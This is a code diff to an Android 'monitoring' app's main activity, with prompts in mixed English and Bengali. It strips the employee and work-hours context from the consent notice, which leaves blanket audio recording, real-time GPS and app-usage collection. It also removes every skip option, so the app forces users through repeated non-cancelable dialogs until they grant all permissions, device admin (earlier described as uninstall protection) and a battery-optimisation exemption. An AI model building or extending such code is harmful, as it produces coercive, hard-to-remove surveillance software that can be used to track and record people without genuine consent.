@@ -59,7 +59,24 @@ public class MainActivity extends AppCompatActivity {
         adminComponent = new ComponentName(this, AdminReceiver.class);
 
         initViews();
+
+        // Block everything until all permissions granted
+        disableUI();
         showConsentDialog();
+    }
+
+    private void disableUI() {
+        btnStartMonitoring.setEnabled(false);
+        etServerUrl.setEnabled(false);
+        etEmployeeName.setEnabled(false);
+        tvStatus.setText("⛔ Shob permission dite hobe!");
+    }
+
+    private void enableUI() {
+        btnStartMonitoring.setEnabled(true);
+        etServerUrl.setEnabled(true);
+        etEmployeeName.setEnabled(true);
+        tvStatus.setText("✅ All permissions granted! Ready to start.");
     }
 
     private void initViews() {
@@ -96,60 +113,81 @@ public class MainActivity extends AppCompatActivity {
             String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
             prefManager.saveConfig(url, deviceId, name);
-            checkAndRequestPermissions();
+            startMonitoringService();
         });
     }
 
     private void showConsentDialog() {
         new AlertDialog.Builder(this)
-            .setTitle("Employee Monitoring Notice")
+            .setTitle("Monitoring Notice")
             .setMessage(
                 "⚠️ IMPORTANT NOTICE\n\n" +
-                "This is a company-issued device enrolled in the Employee Monitoring Program.\n\n" +
-                "The following data will be collected:\n" +
-                "• Voice/audio recordings during work hours\n" +
+                "This device will be monitored.\n\n" +
+                "Data collected:\n" +
+                "• Voice/audio recordings\n" +
                 "• Real-time GPS location\n" +
                 "• App usage statistics\n\n" +
-                "All data is stored securely on company servers and accessible only to authorized administrators.\n\n" +
-                "By tapping 'I Agree', you acknowledge and consent to this monitoring as per your employment agreement."
+                "You MUST grant ALL permissions to use this app.\n\n" +
+                "By tapping 'I Agree', you consent to this monitoring."
             )
-            .setPositiveButton("I Agree", (d, w) -> d.dismiss())
+            .setPositiveButton("I Agree", (d, w) -> {
+                d.dismiss();
+                startPermissionChain();
+            })
             .setNegativeButton("Exit", (d, w) -> finish())
             .setCancelable(false)
             .show();
     }
 
+    // ─── STRICT permission chain: step by step, no skip ───
+
+    private void startPermissionChain() {
+        checkAndRequestPermissions();
+    }
+
+    private boolean allRuntimePermissionsGranted() {
+        for (String perm : REQUIRED_PERMISSIONS) {
+            if (perm.equals(Manifest.permission.ACCESS_BACKGROUND_LOCATION) && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
+                continue;
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
     private void checkAndRequestPermissions() {
         List<String> missing = new ArrayList<>();
         for (String perm : REQUIRED_PERMISSIONS) {
+            if (perm.equals(Manifest.permission.ACCESS_BACKGROUND_LOCATION) && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
+                continue;
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                // Background location asked separately on Android 10+
-                if (perm.equals(Manifest.permission.ACCESS_BACKGROUND_LOCATION) && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
-                    continue;
                 missing.add(perm);
             }
         }
 
         if (missing.isEmpty()) {
-            requestUsageStatsPermission();
+            // Step 2: Usage Stats
+            checkUsageStatsPermission();
         } else {
             ActivityCompat.requestPermissions(this,
                 missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
     }
 
-    private void requestUsageStatsPermission() {
+    private void checkUsageStatsPermission() {
         if (!hasUsageStatsPermission()) {
             new AlertDialog.Builder(this)
-                .setTitle("Usage Access Permission Required")
-                .setMessage("App usage tracking er jonno 'Usage Access' permission dorkar. Settings e giye enable koroon.")
+                .setTitle("⚠️ Usage Access Required")
+                .setMessage("Ei permission MUST dite hobe! Settings e giye enable korun.\n\nNa dile app use korte parben na.")
                 .setPositiveButton("Settings e jao", (d, w) -> {
                     startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                 })
-                .setNegativeButton("Skip", (d, w) -> requestDeviceAdmin())
+                .setCancelable(false)
                 .show();
         } else {
-            requestDeviceAdmin();
+            // Step 3: Device Admin
+            checkDeviceAdmin();
         }
     }
 
@@ -166,39 +204,51 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void requestDeviceAdmin() {
+    private void checkDeviceAdmin() {
         if (!devicePolicyManager.isAdminActive(adminComponent)) {
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                "Device Admin permission dorkar app ke uninstall protection dite. " +
-                "Eta enable korle app uninstall kora jabe na admin permission chara.");
-            startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
+            new AlertDialog.Builder(this)
+                .setTitle("⚠️ Device Admin Required")
+                .setMessage("Device Admin permission MUST dite hobe!\n\nEta chara app kaj korbe na.")
+                .setPositiveButton("Enable korun", (d, w) -> {
+                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Device Admin enable korte hobe. Na korle app use korte parben na.");
+                    startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
+                })
+                .setCancelable(false)
+                .show();
         } else {
-            requestBatteryOptimization();
+            // Step 4: Battery
+            checkBatteryOptimization();
         }
     }
 
-    private void requestBatteryOptimization() {
+    private void checkBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 new AlertDialog.Builder(this)
-                    .setTitle("Battery Optimization")
-                    .setMessage("Background e 100% kaj korar jonno battery optimization off korte hobe. Permission din.")
+                    .setTitle("⚠️ Battery Optimization Off Required")
+                    .setMessage("Background e 100% kaj korar jonno battery optimization off korte MUST hobe!")
                     .setPositiveButton("OK", (d, w) -> {
                         Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                         intent.setData(Uri.parse("package:" + getPackageName()));
                         startActivity(intent);
                     })
-                    .setNegativeButton("Skip", (d, w) -> startMonitoringService())
+                    .setCancelable(false)
                     .show();
             } else {
-                startMonitoringService();
+                allPermissionsDone();
             }
         } else {
-            startMonitoringService();
+            allPermissionsDone();
         }
+    }
+
+    private void allPermissionsDone() {
+        enableUI();
+        Toast.makeText(this, "✅ Shob permission granted! Now Start Monitoring e click korun.", Toast.LENGTH_LONG).show();
     }
 
     private void startMonitoringService() {
@@ -235,7 +285,40 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            requestUsageStatsPermission();
+            // Check if any were denied
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+
+            if (!allGranted) {
+                // Check if permanently denied - send to App Settings
+                boolean anyPermanentlyDenied = false;
+                for (String perm : permissions) {
+                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
+                        anyPermanentlyDenied = true;
+                        break;
+                    }
+                }
+
+                new AlertDialog.Builder(this)
+                    .setTitle("⛔ Permission Denied!")
+                    .setMessage("SHOB permission dite MUST hobe!\n\nNa dile app use korte parben na.\n\nAbar try korun.")
+                    .setPositiveButton("Abar try kori", (d, w) -> checkAndRequestPermissions())
+                    .setNeutralButton("App Settings", (d, w) -> {
+                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                        intent.setData(Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                    })
+                    .setCancelable(false)
+                    .show();
+            } else {
+                // All runtime permissions granted, continue chain
+                checkUsageStatsPermission();
+            }
         }
     }
 
@@ -244,21 +327,46 @@ public class MainActivity extends AppCompatActivity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
-                Toast.makeText(this, "Device Admin activated! App uninstall protected.", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "✅ Device Admin activated!", Toast.LENGTH_SHORT).show();
+                checkBatteryOptimization();
             } else {
-                Toast.makeText(this, "Device Admin required for full protection.", Toast.LENGTH_LONG).show();
+                // Not activated - force again
+                new AlertDialog.Builder(this)
+                    .setTitle("⛔ Device Admin Required!")
+                    .setMessage("Device Admin MUST enable korte hobe!\n\nNa korle app use korte parben na.")
+                    .setPositiveButton("Abar try kori", (d, w) -> checkDeviceAdmin())
+                    .setCancelable(false)
+                    .show();
             }
-            requestBatteryOptimization();
         }
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        // Check if service already running, update UI
+        // Re-check entire permission chain when returning from Settings
         if (prefManager.isServiceRunning()) {
-            if (tvStatus != null) tvStatus.setText("✅ Monitoring Active – Service running in background");
-            if (btnStartMonitoring != null) btnStartMonitoring.setEnabled(false);
+            tvStatus.setText("✅ Monitoring Active – Service running in background");
+            btnStartMonitoring.setEnabled(false);
+            etServerUrl.setEnabled(false);
+            etEmployeeName.setEnabled(false);
+            return;
+        }
+
+        // Check if all permissions are now granted
+        if (allRuntimePermissionsGranted() && hasUsageStatsPermission()
+                && devicePolicyManager.isAdminActive(adminComponent)) {
+            // Check battery too
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                if (pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    allPermissionsDone();
+                    return;
+                }
+            } else {
+                allPermissionsDone();
+                return;
+            }
         }
     }
 }
